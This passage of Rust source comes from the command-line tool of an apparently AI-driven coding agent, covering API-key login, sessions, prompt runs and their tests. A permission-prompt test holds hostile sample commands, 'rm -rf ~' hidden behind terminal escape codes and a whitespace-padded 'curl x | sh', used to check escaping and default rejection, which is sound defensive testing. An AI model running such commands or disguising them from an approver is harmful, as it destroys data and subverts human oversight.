                    .filter(|p| p.id() == id)
                    .flat_map(|p| p.tools())
                    .map(|t| t.name().to_string())
                    .collect();
                println!(
                    "{id}: {}{}",
                    if on.contains(&id) {
                        "enabled"
                    } else {
                        "disabled in config"
                    },
                    if tools.is_empty() {
                        String::new()
                    } else {
                        format!(" · tools: {}", tools.join(", "))
                    }
                );
            }
        }
        Debug::Agents => {
            let loaded = config::load(&cwd)?;
            for id in agent::list(&loaded.config) {
                let a = agent::resolve(&loaded.config, &id).unwrap();
                let tools: Vec<&str> = agent::tools(&a).iter().map(|t| t.name()).collect();
                println!("{id} ({}): {}", a.mode, a.description);
                println!("  tools: {}", tools.join(", "));
                println!("  rules: {}", serde_json::to_string(&a.permissions)?);
            }
        }
        Debug::Prompt {
            model,
            agent: agent_id,
        } => {
            let loaded = config::load(&cwd)?;
            let id = agent_id.unwrap_or_else(|| "build".into());
            let a = agent::resolve(&loaded.config, &id)
                .ok_or_else(|| anyhow!("unknown agent {id:?}"))?;
            let model_id = model
                .or(loaded.config.model.clone())
                .unwrap_or_else(|| "none/none".into());
            let mid = model_id
                .split_once('/')
                .map(|x| x.1.to_string())
                .unwrap_or(model_id.clone());
            let mut offered = agent::tools(&a);
            let provider_id = loaded
                .config
                .resolve_model(&model_id)
                .map(|m| m.model_id)
                .unwrap_or_else(|_| mid.clone());
            codesmith_core::tool::apply_patch::offer_for_spec(
                &mut offered,
                &model_id,
                &provider_id,
            );
            let tools: Vec<&str> = offered.iter().map(|t| t.name()).collect();
            let env = prompt::environment(&prompt::Environment {
                cwd: &cwd,
                root: &loaded.root,
                is_git: loaded.root.join(".git").exists(),
                tmp: &paths::tmp_dir(),
                date: prompt::today(),
            });
            let files = instructions::discover(
                &cwd,
                &loaded.root,
                &paths::config_dir(),
                &loaded.config.instructions,
            );
            println!(
                "{}",
                prompt::assemble(
                    a.system.as_deref(),
                    &mid,
                    &tools,
                    &env,
                    &instructions::render(&files)
                )
            );
        }
    }
    Ok(())
}

/// Whether stdin is something to read a prompt from: a pipe or a file.
/// A terminal, a socket or a device left open by the parent may never reach
/// end-of-file, so reading it would hang.
fn stdin_has_input() -> bool {
    if std::io::stdin().is_terminal() {
        return false;
    }
    // fstat the descriptor itself: on macOS, stat of `/dev/stdin` races a
    // writer closing its end of the pipe and can report no file type (or
    // EBADF), which dropped piped input from `echo hi | codesmith run`.
    #[cfg(unix)]
    {
        use std::os::fd::AsFd;
        use std::os::unix::fs::FileTypeExt;
        match std::io::stdin()
            .as_fd()
            .try_clone_to_owned()
            .map(std::fs::File::from)
            .and_then(|f| f.metadata())
        {
            Ok(m) => m.file_type().is_fifo() || m.file_type().is_file(),
            Err(_) => false,
        }
    }
    #[cfg(not(unix))]
    true
}

fn read_secret(prompt: &str) -> Result<String> {
    let mut line = String::new();
    if std::io::stdin().is_terminal() {
        eprint!("{prompt}");
        std::io::stderr().flush()?;
        let _ = std::process::Command::new("stty")
            .arg("-echo")
            .stdin(std::process::Stdio::inherit())
            .status();
        let r = std::io::stdin().read_line(&mut line);
        let _ = std::process::Command::new("stty")
            .arg("echo")
            .stdin(std::process::Stdio::inherit())
            .status();
        eprintln!();
        r?;
    } else {
        std::io::stdin().read_to_string(&mut line)?;
    }
    Ok(line.trim().to_string())
}

fn auth_cmd(cwd: &std::path::Path, what: AuthCmd) -> Result<()> {
    use codesmith_core::auth;
    let file = paths::auth_file();
    match what {
        AuthCmd::Login { provider } => {
            let key = read_secret(&format!("API key for {provider}: "))?;
            if key.is_empty() {
                return Err(anyhow!("no key entered"));
            }
            auth::set_in(&file, &provider, &key)?;
            println!("Saved a key for {provider} in {}", file.display());
            let loaded = config::load(cwd)?;
            if loaded.config.provider(&provider).is_none() {
                println!("note: {provider} is not a built-in provider; add it under \"providers\" in codesmith.json to use it");
            }
        }
        AuthCmd::List => {
            let loaded = config::load(cwd)?;
            let c = &loaded.config;
            let saved = auth::providers_in(&file);
            let mut ids: Vec<String> = config::BUILTIN.iter().map(|b| b.0.to_string()).collect();
            ids.extend(
                c.providers
                    .keys()
                    .chain(saved.iter())
                    .filter(|k| !ids.contains(k))
                    .cloned()
                    .collect::<Vec<_>>(),
            );
            ids.dedup();
            for id in ids {
                let p = c.provider(&id).unwrap_or_default();
                let source = if p.settings.api_key.as_deref().is_some_and(|k| !k.is_empty()) {
                    "config".to_string()
                } else if let Some(v) = p
                    .env
                    .iter()
                    .find(|v| std::env::var(v).is_ok_and(|k| !k.is_empty()))
                {
                    format!("${v}")
                } else if let Some(k) = auth::key_in(&file, &id) {
                    format!("saved {}", auth::mask(&k))
                } else if p.env.is_empty() {
                    "none needed".into()
                } else {
                    "—".into()
                };
                println!("{id:<12} {source}");
            }
        }
        AuthCmd::Logout { provider } => {
            if auth::remove_in(&file, &provider)? {
                println!("Removed the saved key for {provider}");
            } else {
                println!("No saved key for {provider}");
            }
        }
    }
    Ok(())
}

/// Connect to the configured MCP servers, warning about any that fail.
pub(crate) async fn connect_mcp(
    loaded: &config::Loaded,
    warn: bool,
) -> Arc<codesmith_core::mcp::Mcp> {
    let mcp = codesmith_core::mcp::Mcp::connect(&loaded.config.mcp, &loaded.root).await;
    if warn {
        for (name, s) in &mcp.statuses {
            match s {
                codesmith_core::mcp::Status::Failed(e) => eprintln!("\x1b[33mwarning:\x1b[0m MCP server {name} failed to start: {e}"),
                codesmith_core::mcp::Status::NeedsAuth => eprintln!("\x1b[33mwarning:\x1b[0m MCP server {name} needs authorization: run `codesmith mcp auth {name}`"),
                _ => {}
            }
        }
    }
    mcp
}

pub(crate) fn all_commands(
    cwd: &std::path::Path,
    loaded: &config::Loaded,
) -> std::collections::BTreeMap<String, command::Command> {
    let home = std::env::var_os("HOME")
        .map(PathBuf::from)
        .unwrap_or_default();
    command::discover(
        command::builtins(&loaded.root),
        &command::roots(cwd, &loaded.root, &paths::config_dir(), &home),
        &loaded.config.commands,
    )
}

/// Every command, with the MCP servers' prompts as `/server:prompt`
/// (a same-named custom command wins).
pub(crate) fn all_commands_with(
    cwd: &std::path::Path,
    loaded: &config::Loaded,
    mcp: &codesmith_core::mcp::Mcp,
) -> std::collections::BTreeMap<String, command::Command> {
    let mut all = mcp.commands();
    all.extend(all_commands(cwd, loaded));
    all
}

fn open_store() -> Result<Store> {
    let path = store::default_path();
    Store::open(&path).with_context(|| format!("session store {}", path.display()))
}

fn session_cmd(cwd: PathBuf, what: SessionCmd) -> Result<()> {
    let mut db = open_store()?;
    match what {
        SessionCmd::List { all, json } => {
            let dir = cwd.display().to_string();
            let list = db.list(if all { None } else { Some(&dir) }, false)?;
            if json {
                println!("{}", serde_json::to_string_pretty(&list)?);
                return Ok(());
            }
            if list.is_empty() {
                println!(
                    "No sessions{}.",
                    if all {
                        ""
                    } else {
                        " in this directory (use --all for every directory)"
                    }
                );
            }
            for s in list {
                let when = chrono_like(s.updated);
                let title = s.title.as_deref().unwrap_or("(untitled)");
                if all {
                    println!("{}  {when}  {title}  \x1b[2m{}\x1b[0m", s.id, s.directory);
                } else {
                    println!("{}  {when}  {title}", s.id);
                }
            }
        }
        SessionCmd::Delete { id } => {
            if db.delete(&id)? {
                println!("Deleted {id}");
            } else {
                return Err(anyhow!("no session {id}"));
            }
        }
        SessionCmd::Undo { id } => {
            let (info, snaps) = snapshot_target(&db, &cwd, id)?;
            match session::undo(&db, &info.id, &snaps)? {
                Some(changes) => {
                    println!(
                        "Undid the latest turn of {}; restored {} file(s):",
                        info.id,
                        changes.len()
                    );
                    print_changes(&changes, false);
                }
                None => println!("Nothing to undo in {}.", info.id),
            }
        }
        SessionCmd::Redo { id } => {
            let (info, snaps) = snapshot_target(&db, &cwd, id)?;
            match session::redo(&db, &info.id, &snaps)? {
                Some(changes) => {
                    println!(
                        "Redid the turn in {}; reapplied {} file(s):",
                        info.id,
                        changes.len()
                    );
                    print_changes(&changes, true);
                }
                None => println!(
                    "Nothing to redo in {} (a new turn after an undo makes it permanent).",
                    info.id
                ),
            }
        }
        SessionCmd::Diff { id } => {
            let (info, snaps) = snapshot_target(&db, &cwd, id)?;
            match session::turn_diff(&db, &info.id, &snaps)? {
                Some(d) if d.trim().is_empty() => {
                    println!("No file changes since the latest turn began.")
                }
                Some(d) => print!("{d}"),
                None => println!("No snapshot recorded for {}.", info.id),
            }
        }
        SessionCmd::Export { id } => {
            println!("{}", serde_json::to_string_pretty(&db.export(&id)?)?)
        }
        SessionCmd::Import { file } => {
            let text = if file == "-" {
                let mut s = String::new();
                std::io::stdin().read_to_string(&mut s)?;
                s
            } else {
                std::fs::read_to_string(&file).with_context(|| format!("reading {file}"))?
            };
            let e: store::Export =
                serde_json::from_str(&text).context("not a codesmith session export")?;
            db.import(&e)?;
            println!("Imported {}", e.info.id);
        }
    }
    Ok(())
}

fn snapshot_target(
    db: &Store,
    cwd: &std::path::Path,
    id: Option<String>,
) -> Result<(store::Info, Snapshots)> {
    let info = match id {
        Some(id) => db.get(&id)?.ok_or_else(|| anyhow!("no session {id}"))?,
        None => db
            .latest(&cwd.display().to_string())?
            .ok_or_else(|| anyhow!("no session in {}", cwd.display()))?,
    };
    let root = config::project_root(std::path::Path::new(&info.directory));
    let snaps = Snapshots::for_project(&root)
        .ok_or_else(|| anyhow!("snapshots are not kept for {}", root.display()))?;
    Ok((info, snaps))
}

/// `changes` are relative to the tree being restored: `A` files exist now but
/// not there, `D` files exist there but not now.
fn print_changes(changes: &[codesmith_core::snapshot::Change], redo: bool) {
    for c in changes {
        let what = match (c.status, redo) {
            ('A', _) => "removed",
            ('D', false) => "restored",
            ('D', true) => "recreated",
            (_, false) => "reverted",
            (_, true) => "reapplied",
        };
        println!("  {what:9} {}", c.path);
    }
}

/// "YYYY-MM-DD HH:MM" in local time for a millisecond timestamp.
fn chrono_like(ms: i64) -> String {
    let secs = ms / 1000;
    let out = std::process::Command::new("/bin/date")
        .arg("-r")
        .arg(secs.to_string())
        .arg("+%Y-%m-%d %H:%M")
        .output();
    out.ok()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| secs.to_string())
}

async fn run_prompt(cwd: PathBuf, args: RunArgs) -> Result<()> {
    let db = match open_store() {
        Ok(s) => Some(s),
        Err(e) => {
            if args.r#continue || args.session.is_some() {
                return Err(e);
            }
            eprintln!("\x1b[33mwarning:\x1b[0m sessions will not be saved: {e:#}");
            None
        }
    };
    let resume = match (&args.session, args.r#continue, &db) {
        (Some(id), _, _) => Some(id.clone()),
        (None, true, Some(s)) => Some(
            s.latest(&cwd.display().to_string())?
                .ok_or_else(|| anyhow!("no session to continue in {}", cwd.display()))?
                .id,
        ),
        _ => None,
    };
    let mut message = args.message.join(" ");
    if stdin_has_input() {
        let mut piped = String::new();
        std::io::stdin().read_to_string(&mut piped)?;
        if !piped.trim().is_empty() {
            if !message.is_empty() {
                message.push_str("\n\n");
            }
            message.push_str(piped.trim_end());
        }
    }
    // Images and PDFs (by their bytes) are attached once the config, and so
    // the image limits, is loaded.
    let mut media_files = Vec::new();
    for f in &args.files {
        let mut head = Vec::new();
        {
            use std::io::Read;
            std::fs::File::open(f)
                .with_context(|| format!("reading {}", f.display()))?
                .take(codesmith_core::media::SNIFF_BYTES as u64)
                .read_to_end(&mut head)?;
        }
        if codesmith_core::media::detect(&head).is_some() {
            media_files.push(f.clone());
            continue;
        }
        let text =
            std::fs::read_to_string(f).with_context(|| format!("reading {}", f.display()))?;
        message.push_str(&format!(
            "\n\n<file path=\"{}\">\n{}\n</file>",
            f.display(),
            text.trim_end()
        ));
    }
    if message.trim().is_empty() && media_files.is_empty() {
        return Err(anyhow!(
            "no message: pass one as an argument or pipe it on stdin"
        ));
    }
    // Only now, with a message to send, create the worktree.
    let cwd = match &args.worktree {
        Some(name) => enter_worktree(&cwd, name)?,
        None => cwd,
    };
    let loaded = config::load(&cwd)?;
    let mut media = Vec::new();
    for f in &media_files {
        let name = f.display().to_string();
        match codesmith_core::media::attachment(f, &name, &loaded.config.media.image) {
            Ok(Some(m)) => media.push(m),
            Ok(None) => return Err(anyhow!("{name} is not an image, PDF or video")),
            Err(e) => return Err(anyhow!(e)),
        }
    }
    let (mut agent_arg, mut model_arg) = (args.agent, args.model);
    let mut native: Option<(String, String)> = None;
    let mut mcp_prompt: Option<(command::Command, String)> = None;
    let mcp = connect_mcp(&loaded, args.format != Format::Json).await;
    if let Some((name, rest)) = command::parse_invocation(&message) {
        let all = all_commands_with(&cwd, &loaded, &mcp);
        let c = all.get(&name).ok_or_else(|| {
            anyhow!(
                "unknown command /{name}; available: {}",
                all.keys()
                    .map(|k| format!("/{k}"))
                    .collect::<Vec<_>>()
                    .join(", ")
            )
        })?;
        if c.native {
            native = Some((name.clone(), rest.clone()));
        } else if c.mcp.is_some() {
            mcp_prompt = Some((c.clone(), rest.clone()));
        } else {
            message = command::expand(&c.template, &rest);
        }
        agent_arg = agent_arg.or(c.agent.clone());
        model_arg = model_arg.or(c.model.clone());
    }
    let interactive = !args.auto
        && std::fs::OpenOptions::new()
            .read(true)
            .write(true)
            .open("/dev/tty")
            .is_ok();
    let questioner: Option<Arc<dyn codesmith_core::question::Questioner>> = if interactive {
        Some(Arc::new(Terminal))
    } else {
        None
    };
    let asker: Arc<dyn Asker> = if args.auto {
        Arc::new(Fixed(Reply::Once))
    } else {
        Arc::new(Terminal)
    };
    let mut session = Session::new(
        &loaded,
        cwd,
        Options {
            agent: agent_arg,
            model: model_arg,
            resume,
            title: args.title,
            parent: None,
            questioner,
            mcp: Some(mcp),
        },
        asker,
        db,
    )?;
    if let Some((c, rest)) = &mcp_prompt {
        message = session.expand_command(c, rest).await?;
    }
    let json = args.format == Format::Json;
    let mut sink = render::Printer::new(json, args.thinking);
    if !json {
        eprintln!(
            "\x1b[2m> {} · {}/{} · {}\x1b[0m",
            session.agent.name, session.model.provider_id, session.model.model_id, session.id
        );
    }
    let result = match native {
        Some((name, rest)) => {
            let env = codesmith_core::review::Env::new(
                &loaded,
                session.cwd.clone(),
                Some(session.model_spec.clone()),
                Some(store::default_path()),
                Some(session.id.clone()),
                None,
            );
            let progress = |s: String| eprintln!("\x1b[2m{name}: {s}\x1b[0m");
            match codesmith_core::review::run_command(&name, &rest, &env, &progress).await {
                Ok((report, usage)) => {
                    sink.text(&report);
                    session.append_exchange(&message, &report, &usage)
                }
                Err(e) => Err(e),
            }
        }
        None => run_turn(&mut session, &message, media, &mut sink).await,
    };
    sink.done(
        &session.usage,
        result.as_ref().err().map(|e| e.to_string()),
        &session.id,
        session.title.as_deref(),
    );
    result
}

/// The prompt of `codesmith run`, then its background commands, as
/// OpenCode's `run` does: the model is resumed with each result until none
/// are left. Ctrl-C (or SIGTERM) stops the turn and every command it
/// started, process groups included, and fails the run; a second Ctrl-C
/// while the first is still being handled (a permission prompt is waiting
/// on the terminal, say) kills the commands and exits at once.
async fn run_turn(
    session: &mut Session,
    message: &str,
    media: Vec<codesmith_ai::Media>,
    sink: &mut render::Printer,
) -> Result<()> {
    let (tx, mut rx) = tokio::sync::oneshot::channel::<&'static str>();
    let reaper = session.reaper();
    let watcher = tokio::spawn(async move {
        let why = interrupt_signal().await;
        let _ = tx.send(why);
        interrupt_signal().await;
        eprintln!("\x1b[2minterrupted again: exiting\x1b[0m");
        reaper.kill_all();
        std::process::exit(130);
    });
    let outcome = {
        let turn = async {
            session.prompt_with(message, media, &mut *sink).await?;
            session.settle_background(&mut *sink).await
        };
        tokio::select! {
            r = turn => Ok(r),
            why = &mut rx => Err(why.unwrap_or("interrupted")),
        }
    };
    let result = match outcome {
        Ok(r) => r,
        Err(why) => {
            // The turn future is gone: a running foreground command was
            // stopped with it. Now the background ones.
            eprintln!("\x1b[2m{why}: stopping background commands…\x1b[0m");
            session.stop_background().await;
            Err(anyhow!("{why}"))
        }
    };
    watcher.abort();
    result
}

/// Resolves on the next SIGINT or SIGTERM, naming it.
async fn interrupt_signal() -> &'static str {
    #[cfg(unix)]
    {
        use tokio::signal::unix::{signal, SignalKind};
        let (Ok(mut int), Ok(mut term)) = (
            signal(SignalKind::interrupt()),
            signal(SignalKind::terminate()),
        ) else {
            return std::future::pending().await;
        };
        tokio::select! {
            _ = int.recv() => "interrupted",
            _ = term.recv() => "terminated",
        }
    }
    #[cfg(not(unix))]
    {
        let _ = tokio::signal::ctrl_c().await;
        "interrupted"
    }
}

/// `debug model`'s variant list: each variant with its options (body and
/// header names too), the selected one starred. The variants are built as
/// `resolve_model` builds them: the built-in reasoning ones, then the
/// configured ones, which win.
fn variant_lines(c: &config::Config, m: &config::ModelRef, key: &str) -> Result<Vec<String>> {
    let configured = c
        .provider(&m.provider_id)
        .and_then(|p| p.models.get(key).cloned())
        .unwrap_or_default();
    let mut variants =
        codesmith_ai::builtin_variants(m.provider.protocol, &m.model_id, m.max_output);
    for (name, v) in configured.variants() {
        match variants.iter_mut().find(|(n, _)| *n == name) {
            Some(slot) => slot.1 = v,
            None => variants.push((name, v)),
        }
    }
    let width = variants.iter().map(|(n, _)| n.len()).max().unwrap_or(0);
    let mut out = vec![];
    for (name, v) in &variants {
        let mark = if m.variant.as_deref() == Some(name.as_str()) {
            "*"
        } else {
            " "
        };
        let mut line = format!(
            "{mark} {name:width$}  {}",
            serde_json::to_value(&v.options)?
        );
        if !v.body.is_empty() {
            line.push_str(&format!(
                " body {}",
                serde_json::Value::Object(v.body.clone())
            ));
        }
        if !v.headers.is_empty() {
            let names: Vec<&str> = v.headers.iter().map(|h| h.0.as_str()).collect();
            line.push_str(&format!(" headers {}", names.join(", ")));
        }
        out.push(line);
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Every subcommand and argument says what it is: a missing doc comment
    /// prints a blank line in `--help`.
    #[test]
    fn every_subcommand_and_arg_has_help() {
        use clap::CommandFactory;
        fn walk(cmd: &clap::Command, path: &str, missing: &mut Vec<String>) {
            for a in cmd.get_arguments() {
                let id = a.get_id().as_str();
                if a.is_hide_set() || id == "help" || id == "version" {
                    continue;
                }
                let help = a.get_help().map(|h| h.to_string()).unwrap_or_default();
                if help.trim().is_empty() {
                    missing.push(format!("{path} <{id}>"));
                }
            }
            for sub in cmd.get_subcommands() {
                let p = format!("{path} {}", sub.get_name());
                if sub.get_name() == "help" {
                    continue;
                }
                let about = sub.get_about().map(|h| h.to_string()).unwrap_or_default();
                if about.trim().is_empty() {
                    missing.push(p.clone());
                }
                walk(sub, &p, missing);
            }
        }
        let cmd = Cli::command();
        cmd.clone().debug_assert();
        let mut missing = vec![];
        walk(&cmd, "codesmith", &mut missing);
        assert!(missing.is_empty(), "no help text: {missing:#?}");
    }

    #[test]
    fn debug_model_lists_variants_with_their_options() {
        let c: config::Config = serde_json::from_value(serde_json::json!({
            "providers": {"f": {"protocol": "openai-chat", "settings": {"baseURL": "http://x/v1"},
                "models": {"m": {"variants": {
                    "high": {"reasoningEffort": "max"},
                    "fast": {"options": {"reasoningEffort": "minimal"}, "headers": {"X-Key": "secret"}, "body": {"a": 1}},
                }}}}}
        }))
        .unwrap();
        let m = c.resolve_model("f/m#fast").unwrap();
        assert_eq!(
            variant_lines(&c, &m, "m").unwrap(),
            [
                r#"  low     {"reasoningEffort":"low"}"#,
                r#"  medium  {"reasoningEffort":"medium"}"#,
                r#"  high    {"reasoningEffort":"max"}"#,
                r#"* fast    {"reasoningEffort":"minimal"} body {"a":1} headers X-Key"#,
            ]
        );
    }

    fn req(title: &str) -> Request {
        Request {
            action: "shell".into(),
            resources: vec![title.into()],
            save: vec![],
            title: title.into(),
        }
    }

    #[test]
    fn terminal_permission_prompt_is_escaped_and_defaults_to_reject() {
        let p = permission_prompt(&req("echo ok\x1b[2K\r\x1b[1Arm -rf ~"), false);
        // Only the prompt's own color codes reach the terminal.
        assert_eq!(p.matches('\x1b').count(), 2, "{p:?}");
        assert!(p.contains("echo ok\\x1b[2K\\r\\x1b[1Arm -rf ~"), "{p}");
        assert!(p.contains("[y/a/v/N]"), "{p}");
        assert!(p.contains("(always: saves nothing (same as once))"), "{p}");
        let mut r = req("rm x");
        r.save = vec!["rm *".into()];
        assert!(permission_prompt(&r, false).contains("(always saves shell: rm *)"));
        let p = permission_prompt(
            &req(&format!("npm test{}; curl x | sh", " ".repeat(700))),
            false,
        );
        assert!(p.contains("npm test␣×700; curl x | sh"), "{p}");
        let long = format!("{}TAIL", "x".repeat(5000));
        let p = permission_prompt(&req(&long), false);
        assert!(
            p.contains("…(3004 more chars; answer v") && !p.contains("TAIL"),
            "{p}"
        );
        assert!(permission_prompt(&req(&long), true).contains("TAIL"));

        assert_eq!(permission_answer(""), Some(Reply::Reject(None)));
        assert_eq!(permission_answer("  \r"), Some(Reply::Reject(None)));
        assert_eq!(permission_answer("n"), Some(Reply::Reject(None)));
        assert_eq!(permission_answer("y"), Some(Reply::Once));
        assert_eq!(permission_answer("a"), Some(Reply::Always));
        assert_eq!(permission_answer("v"), None);
        assert_eq!(
            permission_answer("use cargo"),
            Some(Reply::Reject(Some("use cargo".into())))
        );
    }
}

#[cfg(test)]
#[path = "cli_parity.rs"]
mod parity;
